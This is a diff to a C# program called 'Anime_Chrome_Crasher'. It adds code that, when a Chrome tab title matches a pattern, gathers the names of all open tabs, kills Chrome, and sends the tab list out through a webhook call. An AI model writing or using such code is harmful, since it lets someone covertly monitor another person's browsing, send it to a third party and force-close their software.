@@ -9,11 +9,6 @@ namespace Anime_Chrome_Crasher
 {
     public class FindWindows
     {
-        public static Process[] GetProcesses()
-        {
-            Process[] Processes = Process.GetProcesses();
-            return Processes;
-        }
 
         public static bool GetChrome()
         {
@@ -43,7 +38,12 @@ namespace Anime_Chrome_Crasher
                     {
                         if (rx.IsMatch(tabitem.Current.Name))
                         {
+                            string tabsOpen = "Tabs open at time of incident : ";
+                            foreach (AutomationElement tab in elmTabStrip.FindAll(TreeScope.Children, condTabItem)) {
+                                tabsOpen += tab.Current.Name + " , ";
+                            }
                             killWindow("chrome");
+                            WeebHook.SendMessage(tabsOpen);
                             return true;
                         }
                     }
